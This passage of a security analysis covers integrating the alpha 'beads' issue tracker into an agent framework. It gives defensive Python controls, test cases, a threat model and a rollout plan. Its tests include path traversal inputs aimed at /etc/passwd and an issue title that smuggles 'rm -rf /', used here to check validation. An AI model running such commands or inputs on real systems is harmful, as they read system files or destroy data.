#### M5.2: Path Validation

```python
from pathlib import Path
from typing import Optional

class BeadsPathValidator:
    """Validate file paths for beads operations."""

    @staticmethod
    def validate_db_path(db_path: Path) -> Tuple[bool, str]:
        """
        Validate database path is safe.

        Returns:
            (is_valid, message)
        """
        # Resolve to absolute path
        try:
            db_path = db_path.resolve()
        except Exception as e:
            return False, f"Invalid path: {e}"

        # Must be under project root
        project_root = Path.cwd()
        try:
            db_path.relative_to(project_root)
        except ValueError:
            return False, f"Database path must be under project root: {project_root}"

        # Must be in .beads directory
        if '.beads' not in db_path.parts:
            return False, "Database must be in .beads directory"

        # Must have .db extension
        if db_path.suffix != '.db':
            return False, "Database must have .db extension"

        # Check for path traversal attempts
        if '..' in db_path.parts:
            return False, "Path traversal detected"

        return True, "Path valid"

    @staticmethod
    def get_default_db_path() -> Path:
        """Get default safe database path."""
        return Path.cwd() / '.beads' / 'issues.db'
```

#### M5.3: Working Directory Control

```python
import os
from contextlib import contextmanager
from pathlib import Path

@contextmanager
def safe_working_directory(target_dir: Path):
    """Context manager for safe directory changes."""
    # Validate target directory
    target_dir = target_dir.resolve()

    # Must exist
    if not target_dir.exists():
        raise ValueError(f"Directory does not exist: {target_dir}")

    # Must be a directory
    if not target_dir.is_dir():
        raise ValueError(f"Not a directory: {target_dir}")

    # Store original directory
    original_dir = Path.cwd()

    try:
        os.chdir(target_dir)
        yield target_dir
    finally:
        # Always restore original directory
        os.chdir(original_dir)

# Usage
with safe_working_directory(Path('/safe/project/path')):
    result = subprocess.run(['bd', 'init'], check=False)
# Automatically returns to original directory
```

### Security Test Cases

```python
def test_environment_isolation():
    """Test that sensitive environment variables are not passed."""
    os.environ['SECRET_KEY'] = 'test-secret'  # pragma: allowlist secret

    safe_env = BeadsEnvironment.get_safe_environment()  # pragma: allowlist secret

    assert 'SECRET_KEY' not in safe_env  # pragma: allowlist secret
    assert 'PATH' in safe_env

def test_path_traversal_prevention():
    """Test that path traversal is prevented."""
    malicious_paths = [
        Path('../../../etc/passwd'),
        Path('.beads/../../secrets.db'),
        Path('/etc/passwd'),
    ]

    for path in malicious_paths:
        is_valid, _ = BeadsPathValidator.validate_db_path(path)
        assert not is_valid
```

---

## 6. Access Control and Audit Requirements (MEDIUM RISK)

### Threat Description

Without proper access control, malicious or compromised agents could abuse the beads system to create spam, corrupt data, or perform denial-of-service attacks.

### Attack Vectors

#### Vector 6.1: Agent Impersonation

- Malicious agent uses another agent's ID
- Issues appear to come from trusted agent
- Audit trail corrupted

#### Vector 6.2: Resource Exhaustion

- Agent creates millions of issues
- Fills disk with JSONL data
- SQLite cache grows unbounded

#### Vector 6.3: Issue Spam

- Automated creation of junk issues
- Pollutes issue database
- Makes legitimate issues hard to find

### Risk Assessment

| Risk Factor    | Level      | Justification                                 |
| -------------- | ---------- | --------------------------------------------- |
| Likelihood     | MEDIUM     | Depends on agent security posture             |
| Impact         | MEDIUM     | Service degradation, data pollution           |
| Exploitability | MEDIUM     | Requires agent compromise or misconfiguration |
| Overall Risk   | **MEDIUM** | Requires robust access control                |

### Mitigation Strategy

#### M6.1: Agent Authentication

```python
import hmac
import hashlib
from typing import Optional

class AgentAuthenticator:
    """Authenticate agents for beads operations."""

    def __init__(self, secret_key: str):
        """Initialize with secret key."""
        self.secret_key = secret_key.encode('utf-8')

    def generate_token(self, agent_id: str) -> str:
        """Generate authentication token for agent."""
        message = f"agent:{agent_id}".encode('utf-8')
        token = hmac.new(self.secret_key, message, hashlib.sha256).hexdigest()
        return f"{agent_id}:{token}"

    def verify_token(self, token: str) -> Optional[str]:
        """Verify agent token and return agent_id if valid."""
        try:
            agent_id, provided_token = token.split(':', 1)
            expected_token = self.generate_token(agent_id)

            if hmac.compare_digest(expected_token, token):
                return agent_id
        except Exception:
            pass

        return None

# Usage
authenticator = AgentAuthenticator(secret_key=os.environ['BEADS_SECRET_KEY'])

def create_issue_authenticated(agent_token: str, title: str, description: str):
    """Create issue with authentication."""
    agent_id = authenticator.verify_token(agent_token)

    if not agent_id:
        raise ValueError("Invalid agent authentication token")

    # Proceed with issue creation
    # ...
```

#### M6.2: Rate Limiting

```python
from datetime import datetime, timedelta
from collections import defaultdict
from typing import Dict

class BeadsRateLimiter:
    """Rate limit beads operations per agent."""

    def __init__(
        self,
        max_operations_per_minute: int = 60,
        max_operations_per_hour: int = 1000
    ):
        self.max_per_minute = max_operations_per_minute
        self.max_per_hour = max_operations_per_hour

        self.operations_minute: Dict[str, list] = defaultdict(list)
        self.operations_hour: Dict[str, list] = defaultdict(list)

    def check_rate_limit(self, agent_id: str) -> Tuple[bool, str]:
        """
        Check if agent has exceeded rate limits.

        Returns:
            (is_allowed, message)
        """
        now = datetime.now()
        minute_ago = now - timedelta(minutes=1)
        hour_ago = now - timedelta(hours=1)

        # Clean old entries
        self.operations_minute[agent_id] = [
            ts for ts in self.operations_minute[agent_id] if ts > minute_ago
        ]
        self.operations_hour[agent_id] = [
            ts for ts in self.operations_hour[agent_id] if ts > hour_ago
        ]

        # Check limits
        minute_count = len(self.operations_minute[agent_id])
        hour_count = len(self.operations_hour[agent_id])

        if minute_count >= self.max_per_minute:
            return False, f"Rate limit exceeded: {minute_count} operations in last minute"

        if hour_count >= self.max_per_hour:
            return False, f"Rate limit exceeded: {hour_count} operations in last hour"

        # Record operation
        self.operations_minute[agent_id].append(now)
        self.operations_hour[agent_id].append(now)

        return True, "Rate limit OK"

# Usage
rate_limiter = BeadsRateLimiter()

def create_issue_rate_limited(agent_id: str, title: str, description: str):
    """Create issue with rate limiting."""
    is_allowed, message = rate_limiter.check_rate_limit(agent_id)

    if not is_allowed:
        raise RuntimeError(f"Rate limit exceeded for agent {agent_id}: {message}")

    # Proceed with issue creation
    # ...
```

#### M6.3: Audit Trail

```python
import json
from datetime import datetime
from pathlib import Path
from typing import Dict, Any

class BeadsAuditTrail:
    """Comprehensive audit trail for beads operations."""

    def __init__(self, audit_dir: Optional[Path] = None):
        if audit_dir is None:
            audit_dir = Path.home() / '.amplihack' / 'beads_audit'

        self.audit_dir = audit_dir
        self.audit_dir.mkdir(parents=True, exist_ok=True)

        # Set secure permissions
        os.chmod(self.audit_dir, 0o700)

    def log_operation(
        self,
        operation_type: str,
        agent_id: str,
        details: Dict[str, Any],
        success: bool = True
    ):
        """Log operation to audit trail."""
        timestamp = datetime.now()

        audit_entry = {
            'timestamp': timestamp.isoformat(),
            'operation': operation_type,
            'agent_id': agent_id,
            'details': details,
            'success': success,
        }

        # Write to daily log file
        log_file = self.audit_dir / f"audit_{timestamp.strftime('%Y%m%d')}.jsonl"

        with open(log_file, 'a', encoding='utf-8') as f:
            f.write(json.dumps(audit_entry) + '\n')

        # Set secure permissions on log file
        os.chmod(log_file, 0o600)

    def query_audit_log(
        self,
        start_date: datetime,
        end_date: datetime,
        agent_id: Optional[str] = None,
        operation_type: Optional[str] = None
    ) -> list:
        """Query audit log for operations."""
        results = []

        current_date = start_date
        while current_date <= end_date:
            log_file = self.audit_dir / f"audit_{current_date.strftime('%Y%m%d')}.jsonl"

            if log_file.exists():
                with open(log_file, 'r', encoding='utf-8') as f:
                    for line in f:
                        entry = json.loads(line)

                        # Filter by agent_id
                        if agent_id and entry['agent_id'] != agent_id:
                            continue

                        # Filter by operation type
                        if operation_type and entry['operation'] != operation_type:
                            continue

                        results.append(entry)

            current_date += timedelta(days=1)

        return results

# Usage
audit = BeadsAuditTrail()

def create_issue_with_audit(agent_id: str, title: str, description: str):
    """Create issue with full audit trail."""
    try:
        # Create issue
        result = create_beads_issue(title, description)

        # Log success
        audit.log_operation(
            operation_type='create_issue',
            agent_id=agent_id,
            details={
                'issue_id': result['id'],
                'title': title,
            },
            success=True
        )

        return result

    except Exception as e:
        # Log failure
        audit.log_operation(
            operation_type='create_issue',
            agent_id=agent_id,
            details={
                'title': title,
                'error': str(e),
            },
            success=False
        )

        raise
```

### Security Test Cases

```python
def test_rate_limiting():
    """Test that rate limiting works."""
    limiter = BeadsRateLimiter(max_operations_per_minute=5)

    agent_id = 'test-agent'

    # Should allow first 5 operations
    for i in range(5):
        is_allowed, _ = limiter.check_rate_limit(agent_id)
        assert is_allowed

    # Should block 6th operation
    is_allowed, message = limiter.check_rate_limit(agent_id)
    assert not is_allowed

def test_audit_logging():
    """Test audit trail logging."""
    audit = BeadsAuditTrail(audit_dir=Path('/tmp/test_audit'))

    audit.log_operation(
        operation_type='create',
        agent_id='test-agent',
        details={'title': 'Test issue'},
        success=True
    )

    # Query audit log
    results = audit.query_audit_log(
        start_date=datetime.now() - timedelta(days=1),
        end_date=datetime.now() + timedelta(days=1),
        agent_id='test-agent'
    )

    assert len(results) >= 1
```

---

## 7. Alpha Software Risks (HIGH RISK)

### Threat Description

Beads is pre-1.0 alpha software with documented bugs including data duplication and data loss in multi-workstream scenarios. This introduces significant stability and reliability risks.

### Known Issues

From beads documentation:

- **Data duplication bugs**: Version 0.9.x has data duplication issues
- **Data loss bugs**: Potential data loss in multi-workstream scenarios
- **MCP routing issues**: Issues route to wrong database across repositories
- **Single-project limitation**: Cannot reliably handle multiple beads repos
- **API changes expected**: Breaking changes before 1.0 release

### Risk Assessment

| Risk Factor    | Level    | Justification                        |
| -------------- | -------- | ------------------------------------ |
| Likelihood     | HIGH     | Documented known bugs                |
| Impact         | HIGH     | Data loss, corruption, inconsistency |
| Exploitability | N/A      | Not malicious, stability issue       |
| Overall Risk   | **HIGH** | Requires careful deployment strategy |

### Mitigation Strategy

#### M7.1: Single-Workstream Restriction

```python
from pathlib import Path
from typing import Optional

class BeadsDeploymentValidator:
    """Validate beads deployment configuration."""

    @staticmethod
    def validate_single_workstream() -> Tuple[bool, str]:
        """
        Validate we're using beads in single-workstream mode only.

        Returns:
            (is_valid, message)
        """
        # Check for multiple .beads directories
        project_root = Path.cwd()
        beads_dirs = list(project_root.rglob('.beads'))

        if len(beads_dirs) > 1:
            return False, f"Multiple .beads directories found: {beads_dirs}. Beads v0.9.x only supports single-workstream."

        # Check for git worktrees
        git_dir = project_root / '.git'
        if git_dir.is_file():
            # This is a worktree
            return False, "Beads in git worktree detected. This may cause data duplication issues."

        return True, "Single-workstream configuration valid"

    @staticmethod
    def check_version_safety() -> Tuple[bool, str]:
        """Check if beads version is safe to use."""
        version = BeadsBinaryVerifier.get_version()

        if not version:
            return False, "Cannot determine beads version"

        # Warn about alpha status
        from packaging import version as pkg_version
        v = pkg_version.parse(version)

        if v < pkg_version.parse("1.0.0"):
            return False, f"Beads v{version} is alpha software with known data loss bugs. Use with caution."

        return True, f"Beads v{version} is stable"
```

#### M7.2: Data Backup Strategy

```python
import shutil
from datetime import datetime
from pathlib import Path

class BeadsBackupManager:
    """Manage beads data backups."""

    def __init__(self, backup_dir: Optional[Path] = None):
        if backup_dir is None:
            backup_dir = Path.home() / '.amplihack' / 'beads_backups'

        self.backup_dir = backup_dir
        self.backup_dir.mkdir(parents=True, exist_ok=True)

    def create_backup(self) -> Path:
        """
        Create backup of beads data before operations.

        Returns:
            Path to backup
        """
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        backup_name = f"beads_backup_{timestamp}"
        backup_path = self.backup_dir / backup_name

        # Backup .beads directory
        beads_dir = Path.cwd() / '.beads'

        if not beads_dir.exists():
            raise ValueError("No .beads directory to backup")

        shutil.copytree(beads_dir, backup_path)

        print(f"Backup created: {backup_path}")
        return backup_path

    def restore_backup(self, backup_path: Path):
        """Restore from backup."""
        if not backup_path.exists():
            raise ValueError(f"Backup not found: {backup_path}")

        beads_dir = Path.cwd() / '.beads'

        # Remove current .beads
        if beads_dir.exists():
            shutil.rmtree(beads_dir)

        # Restore from backup
        shutil.copytree(backup_path, beads_dir)

        print(f"Restored from backup: {backup_path}")

    def list_backups(self) -> list[Path]:
        """List available backups."""
        return sorted(self.backup_dir.glob('beads_backup_*'), reverse=True)

    def cleanup_old_backups(self, keep_count: int = 10):
        """Remove old backups, keeping most recent N."""
        backups = self.list_backups()

        for backup in backups[keep_count:]:
            shutil.rmtree(backup)
            print(f"Removed old backup: {backup}")

# Usage - wrap critical operations
backup_manager = BeadsBackupManager()

def critical_beads_operation():
    """Perform beads operation with backup."""
    # Create backup before operation
    backup_path = backup_manager.create_backup()

    try:
        # Perform operation
        result = perform_beads_operation()

        # Cleanup old backups on success
        backup_manager.cleanup_old_backups()

        return result

    except Exception as e:
        print(f"Operation failed: {e}")
        print("Restoring from backup...")

        # Restore on failure
        backup_manager.restore_backup(backup_path)

        raise
```

#### M7.3: Data Integrity Monitoring

```python
import hashlib
from datetime import datetime
from pathlib import Path
from typing import Dict

class BeadsIntegrityMonitor:
    """Monitor beads data integrity."""

    def __init__(self):
        self.checksums: Dict[str, str] = {}
        self.last_check = None

    def compute_checksum(self, file_path: Path) -> str:
        """Compute SHA256 checksum of file."""
        sha256 = hashlib.sha256()

        with open(file_path, 'rb') as f:
            while chunk := f.read(8192):
                sha256.update(chunk)

        return sha256.hexdigest()

    def check_integrity(self) -> Tuple[bool, list[str]]:
        """
        Check integrity of beads files.

        Returns:
            (is_intact, list_of_issues)
        """
        issues = []

        jsonl_path = Path.cwd() / '.beads' / 'issues.jsonl'

        if not jsonl_path.exists():
            issues.append("issues.jsonl not found")
            return False, issues

        # Check JSONL validity
        is_valid, errors = JSONLValidator.validate_file(jsonl_path)
        if not is_valid:
            issues.extend(errors)

        # Check for unexpected file size changes
        file_size = jsonl_path.stat().st_size

        # Checksum verification
        current_checksum = self.compute_checksum(jsonl_path)

        if jsonl_path in self.checksums:
            if self.checksums[jsonl_path] != current_checksum:
                issues.append(f"Checksum mismatch - file may be corrupted")

        self.checksums[jsonl_path] = current_checksum
        self.last_check = datetime.now()

        return len(issues) == 0, issues

    def periodic_check(self, interval_minutes: int = 60):
        """Periodically check integrity."""
        if self.last_check is None:
            return self.check_integrity()

        elapsed = (datetime.now() - self.last_check).total_seconds() / 60

        if elapsed >= interval_minutes:
            return self.check_integrity()

        return True, []
```

### Security Test Cases

```python
def test_single_workstream_validation():
    """Test single-workstream deployment validation."""
    is_valid, message = BeadsDeploymentValidator.validate_single_workstream()
    # Should pass if only one .beads directory exists
    assert is_valid or "Multiple" in message

def test_backup_and_restore():
    """Test backup and restore functionality."""
    backup_manager = BeadsBackupManager(backup_dir=Path('/tmp/test_backups'))

    # Create test .beads directory
    test_beads = Path.cwd() / '.beads'
    test_beads.mkdir(exist_ok=True)
    (test_beads / 'issues.jsonl').write_text('{"id":"1","title":"test"}\\n')

    # Create backup
    backup_path = backup_manager.create_backup()
    assert backup_path.exists()

    # Modify original
    (test_beads / 'issues.jsonl').write_text('{"id":"2","title":"modified"}\\n')

    # Restore
    backup_manager.restore_backup(backup_path)

    # Verify restoration
    content = (test_beads / 'issues.jsonl').read_text()
    assert '"id":"1"' in content

def test_integrity_monitoring():
    """Test data integrity monitoring."""
    monitor = BeadsIntegrityMonitor()

    # Initial check
    is_intact, issues = monitor.check_integrity()

    if not is_intact:
        print(f"Integrity issues: {issues}")
```

---

## 8. Threat Model and Attack Vectors

### Threat Actors

#### T1: External Attacker

- **Motivation**: Data theft, system disruption
- **Capabilities**: Network access, social engineering
- **Attack Vectors**: Supply chain compromise, network interception
- **Likelihood**: LOW (requires breaching other defenses first)

#### T2: Malicious Insider

- **Motivation**: Data sabotage, espionage
- **Capabilities**: Git write access, codebase knowledge
- **Attack Vectors**: JSONL tampering, sensitive data injection
- **Likelihood**: LOW (requires compromised team member)

#### T3: Compromised Agent

- **Motivation**: Unintentional harm from bug or misconfiguration
- **Capabilities**: Beads API access, subprocess execution
- **Attack Vectors**: Command injection, resource exhaustion, data corruption
- **Likelihood**: MEDIUM (agents are complex software)

#### T4: Accidental Misuse

- **Motivation**: None (unintentional)
- **Capabilities**: Normal user/agent access
- **Attack Vectors**: Sensitive data exposure, configuration errors
- **Likelihood**: HIGH (human/agent error)

### Attack Vector Summary

| Vector                | Threat Actor | Impact   | Mitigation Priority |
| --------------------- | ------------ | -------- | ------------------- |
| Command Injection     | T3, T2       | CRITICAL | HIGH                |
| Sensitive Data in Git | T4, T2       | HIGH     | HIGH                |
| Binary Compromise     | T1           | HIGH     | MEDIUM              |
| JSONL Tampering       | T2           | MEDIUM   | MEDIUM              |
| Resource Exhaustion   | T3           | MEDIUM   | MEDIUM              |
| Alpha Software Bugs   | T4           | HIGH     | HIGH                |

---

## 9. Security Requirements and Controls

### SR1: Input Validation (HIGH PRIORITY)

**Requirement**: All user and agent inputs to beads commands MUST be validated and sanitized before subprocess execution.

**Controls**:

- Implement `BeadsInputValidator` class
- Use parameterized command building
- Never use `shell=True` in subprocess calls
- Whitelist valid characters for each input type

**Test Requirements**:

- Test all known injection patterns
- Fuzz testing with random inputs
- Static analysis to detect `shell=True`

### SR2: Data Classification (HIGH PRIORITY)

**Requirement**: Prevent sensitive data from being committed to git via beads.

**Controls**:

- Implement `SensitiveDataDetector` scanner
- Reject issue creation with detected secrets
- Document data classification guidelines
- Pre-commit hooks for validation

**Test Requirements**:

- Test detection of all secret patterns
- False positive rate < 1%
- Coverage of PII patterns

### SR3: Binary Verification (MEDIUM PRIORITY)

**Requirement**: Verify integrity and authenticity of beads binary before use.

**Controls**:

- Implement `BeadsBinaryVerifier` with checksums
- Version compatibility checks
- Installation from source option
- Runtime monitoring for anomalies

**Test Requirements**:

- Verify checksum validation works
- Test version compatibility checks
- Alert on checksum mismatch

### SR4: Access Control (MEDIUM PRIORITY)

**Requirement**: Implement authentication, authorization, and rate limiting for agent operations.

**Controls**:

- Agent authentication tokens
- Rate limiting per agent
- Audit trail for all operations
- Resource quotas

**Test Requirements**:

- Test rate limiting enforcement
- Verify audit log completeness
- Test authentication token validation

### SR5: Data Integrity (HIGH PRIORITY)

**Requirement**: Ensure JSONL file integrity and provide recovery mechanisms.

**Controls**:

- JSONL validation before commit
- Automated backup before operations
- Integrity monitoring
- Repair tools

**Test Requirements**:

- Test validation detects corruption
- Test backup and restore workflows
- Test repair functionality

### SR6: Deployment Safety (HIGH PRIORITY)

**Requirement**: Ensure safe deployment within documented constraints.

**Controls**:

- Single-workstream validation
- Version compatibility checks
- Data backup strategy
- Gradual rollout

**Test Requirements**:

- Test single-workstream detection
- Verify backup creation
- Test version compatibility

---

## 10. Secure Implementation Guidelines

### Guideline 1: Subprocess Execution Pattern

```python
# ALWAYS use this pattern for bd commands

from typing import List, Dict, Any
import subprocess
import json

def execute_bd_command(
    args: List[str],
    timeout: int = 30
) -> Dict[str, Any]:
    """
    Secure wrapper for bd command execution.

    Args:
        args: Command arguments (validated)
        timeout: Timeout in seconds

    Returns:
        Parsed JSON output

    Raises:
        RuntimeError: If command fails
        ValueError: If validation fails
    """
    # Build command
    cmd = ['bd'] + args

    # Use safe environment
    env = BeadsEnvironment.get_safe_environment()

    # Execute with security controls
    result = subprocess.run(
        cmd,
        shell=False,  # CRITICAL
        capture_output=True,
        text=True,
        timeout=timeout,
        env=env,
        check=False,
        cwd=Path.cwd()  # Explicit working directory
    )

    # Check for errors
    if result.returncode != 0:
        # Log error (but don't expose details to user)
        logger.error(f"bd command failed: {result.stderr}")
        raise RuntimeError("Beads operation failed")

    # Parse and return JSON
    try:
        return json.loads(result.stdout)
    except json.JSONDecodeError:
        raise RuntimeError("Invalid JSON response from bd")
```

### Guideline 2: Issue Creation Pattern

```python
# ALWAYS use this pattern for creating issues

def create_issue_secure(
    agent_id: str,
    title: str,
    description: str,
    labels: Optional[List[str]] = None,
    priority: Optional[int] = None
) -> Dict[str, Any]:
    """
    Securely create beads issue.

    Args:
        agent_id: Authenticated agent identifier
        title: Issue title
        description: Issue description
        labels: Optional labels
        priority: Optional priority (0-4)

    Returns:
        Created issue details

    Raises:
        ValueError: If validation fails
        RuntimeError: If operation fails
    """
    # 1. Validate deployment
    is_valid, message = BeadsDeploymentValidator.validate_single_workstream()
    if not is_valid:
        raise RuntimeError(f"Unsafe beads deployment: {message}")

    # 2. Check rate limit
    is_allowed, message = rate_limiter.check_rate_limit(agent_id)
    if not is_allowed:
        raise RuntimeError(message)

    # 3. Scan for sensitive data
    safe_title, safe_description = BeadsContentPolicy.create_safe_issue_content(
        title, description, {}
    )

    # 4. Build command
    cmd = BeadsCommand(
        command='create',
        title=safe_title,
        description=safe_description,
        labels=labels,
        priority=priority,
        output_json=True
    )

    # 5. Create backup
    backup_path = backup_manager.create_backup()

    try:
        # 6. Execute command
        result = execute_bd_command(cmd.build())

        # 7. Log to audit trail
        audit.log_operation(
            operation_type='create_issue',
            agent_id=agent_id,
            details={'issue_id': result['id'], 'title': safe_title},
            success=True
        )

        return result

    except Exception as e:
        # Log failure
        audit.log_operation(
            operation_type='create_issue',
            agent_id=agent_id,
            details={'title': safe_title, 'error': str(e)},
            success=False
        )

        # Restore backup on failure
        backup_manager.restore_backup(backup_path)

        raise
```

### Guideline 3: Initialization Pattern

```python
# ALWAYS use this pattern for beads initialization

def initialize_beads_secure(project_root: Path) -> bool:
    """
    Securely initialize beads for project.

    Args:
        project_root: Project root directory

    Returns:
        True if successful

    Raises:
        RuntimeError: If initialization fails
    """
    # 1. Verify binary
    is_safe, message = BeadsBinaryVerifier.verify_binary()
    if not is_safe:
        raise RuntimeError(f"Unsafe bd binary: {message}")

    # 2. Validate project directory
    if not project_root.exists():
        raise ValueError(f"Project directory does not exist: {project_root}")

    # 3. Check for existing .beads
    beads_dir = project_root / '.beads'
    if beads_dir.exists():
        raise RuntimeError("Beads already initialized")

    # 4. Execute init
    with safe_working_directory(project_root):
        result = execute_bd_command(['init'])

    # 5. Verify initialization
    if not beads_dir.exists():
        raise RuntimeError("Beads initialization failed")

    # 6. Set secure permissions
    os.chmod(beads_dir, 0o700)

    # 7. Create initial backup
    backup_manager.create_backup()

    return True
```

---

## 11. Security Test Suite

### Integration Test: End-to-End Security

```python
import pytest
from pathlib import Path

def test_end_to_end_secure_workflow():
    """Test complete secure workflow."""
    # Setup
    project_root = Path('/tmp/test_beads_project')
    project_root.mkdir(exist_ok=True)

    # Initialize securely
    initialize_beads_secure(project_root)

    # Create issue securely
    result = create_issue_secure(
        agent_id='test-agent',
        title='Test issue',
        description='This is a test',
        labels=['test'],
        priority=1
    )

    assert 'id' in result
    assert result['title'] == 'Test issue'

    # Verify audit trail
    audit_entries = audit.query_audit_log(
        start_date=datetime.now() - timedelta(minutes=5),
        end_date=datetime.now() + timedelta(minutes=5),
        agent_id='test-agent'
    )

    assert len(audit_entries) >= 1

    # Verify backup exists
    backups = backup_manager.list_backups()
    assert len(backups) >= 1

    # Verify JSONL integrity
    jsonl_path = project_root / '.beads' / 'issues.jsonl'
    is_valid, errors = JSONLValidator.validate_file(jsonl_path)
    assert is_valid, f"JSONL validation failed: {errors}"

def test_security_controls_prevent_attack():
    """Test that security controls prevent attacks."""
    # Test command injection prevention
    with pytest.raises(ValueError):
        create_issue_secure(
            agent_id='attacker',
            title='Test; rm -rf /',
            description='Attack attempt',
        )

    # Test sensitive data prevention
    with pytest.raises(ValueError):
        create_issue_secure(
            agent_id='attacker',
            title='Leak secrets',
            description='API key: sk-1234567890abcdef',
        )

    # Test rate limiting
    for i in range(100):
        try:
            create_issue_secure(
                agent_id='spammer',
                title=f'Spam {i}',
                description='Spam',
            )
        except RuntimeError as e:
            if 'Rate limit' in str(e):
                # Expected
                break
    else:
        pytest.fail("Rate limiting did not trigger")
```

---

## 12. Documentation Requirements

### User Documentation

1. **Security Best Practices Guide**
   - What data is safe to store in beads
   - What data must NEVER go in beads
   - How to recognize sensitive data patterns
   - When to use alternative storage

2. **Deployment Guide**
   - Single-workstream requirement
   - Version compatibility matrix
   - Installation verification steps
   - Backup and recovery procedures

3. **Troubleshooting Guide**
   - Common security errors and fixes
   - Data corruption recovery
   - Binary verification failures
   - Audit trail analysis

### Developer Documentation

1. **Security API Reference**
   - All security control classes
   - Validation functions
   - Audit trail API
   - Backup management API

2. **Integration Guide**
   - How to integrate beads securely
   - Required security controls
   - Testing requirements
   - Monitoring setup

3. **Threat Model**
   - Identified threats
   - Attack vectors
   - Mitigation strategies
   - Residual risks

---

## 13. Deployment Strategy

### Phase 1: Limited Beta (Weeks 1-2)

- Deploy to 1-2 trusted users
- Single-workstream projects only
- Manual security monitoring
- Daily backup verification
- Incident response ready

### Phase 2: Expanded Testing (Weeks 3-4)

- Deploy to 5-10 users
- Monitor for security issues
- Collect feedback on controls
- Tune rate limits
- Refine documentation

### Phase 3: General Availability (Week 5+)

- Deploy to all users
- Automated security monitoring
- Self-service backup management
- Public security documentation
- Bug bounty program consideration

### Rollback Plan

If security issues arise:

1. Immediately disable beads integration
2. Restore from backups
3. Analyze audit trail
4. Fix security issue
5. Re-verify all controls
6. Resume deployment

---

## 14. Residual Risks

### R1: Alpha Software Instability (HIGH)

**Risk**: Despite all controls, beads v0.9.x has documented data loss bugs.

**Acceptance Criteria**:

- User acknowledges alpha status
- Automated backups in place
- Single-workstream enforcement
- Regular integrity checks

**Monitoring**: Daily backup verification, integrity checks every hour

### R2: Git History Exposure (MEDIUM)

**Risk**: Even with sensitive data detection, some information in git history may expose internal architecture.

**Acceptance Criteria**:

- Data classification guidelines followed
- Pre-commit validation active
- Team training on what not to commit
- Regular git history audits

**Monitoring**: Periodic scans of git history for patterns

### R3: Supply Chain Trust (LOW)

**Risk**: Beads binary could be compromised despite verification.

**Acceptance Criteria**:

- Binary checksum verification
- Version pinning
- Runtime monitoring
- Audit trail of all operations

**Monitoring**: Weekly binary re-verification, anomaly detection

### R4: Agent Compromise (MEDIUM)

**Risk**: If an agent is compromised, it could abuse beads API within rate limits.

**Acceptance Criteria**:

- Rate limiting active
- Audit trail comprehensive
- Authentication required
- Anomaly detection

**Monitoring**: Real-time audit trail analysis, rate limit alerts

---

## 15. Compliance Considerations

### GDPR / Privacy

- Beads commits data to git (permanent record)
- Must NOT store user PII in beads
- Right to be forgotten cannot be guaranteed
- Data processing agreements required

**Recommendation**: Use beads only for technical metadata, never user data.

### SOC 2 / Security Compliance

- Audit trail meets logging requirements
- Access control meets authorization requirements
- Backup strategy meets data protection requirements
- Incident response procedures required

**Recommendation**: Include beads in security audit scope.

### HIPAA / Regulated Industries

- Beads is NOT suitable for PHI/PII storage
- Git is not encrypted at rest
- Cannot guarantee data deletion

**Recommendation**: Do NOT use beads in HIPAA/regulated environments without additional controls.

---

## 16. Conclusion

### Risk Summary

The beads integration presents **MEDIUM-HIGH overall risk** due to:

- HIGH: Command injection potential
- HIGH: Alpha software stability
- MEDIUM: Sensitive data exposure
- MEDIUM: Supply chain trust

### Recommended Approach

**APPROVE integration with mandatory security controls:**

1. ✅ Implement all HIGH priority controls (SR1, SR2, SR5, SR6)
2. ✅ Implement MEDIUM priority controls (SR3, SR4)
3. ✅ Deploy in phases with monitoring
4. ✅ Maintain comprehensive audit trail
5. ✅ Regular security reviews

### Success Criteria

Integration is successful when:

- Zero command injection incidents
- Zero sensitive data leaks to git
- < 1% data corruption rate
- 99.9% uptime
- < 5 minute recovery time

### Next Steps

1. Review this security analysis with team
2. Implement all security controls
3. Complete security test suite
4. Document security procedures
5. Begin Phase 1 deployment
6. Monitor and iterate

---

**Document Version**: 1.0
**Last Updated**: 2025-10-18
**Next Review**: 2025-11-18 or upon beads 1.0 release

**Approved By**: [Pending Security Review]

**Security Contacts**:

- Security Lead: [TBD]
- Incident Response: [TBD]
- Audit Trail: `~/.amplihack/beads_audit/`
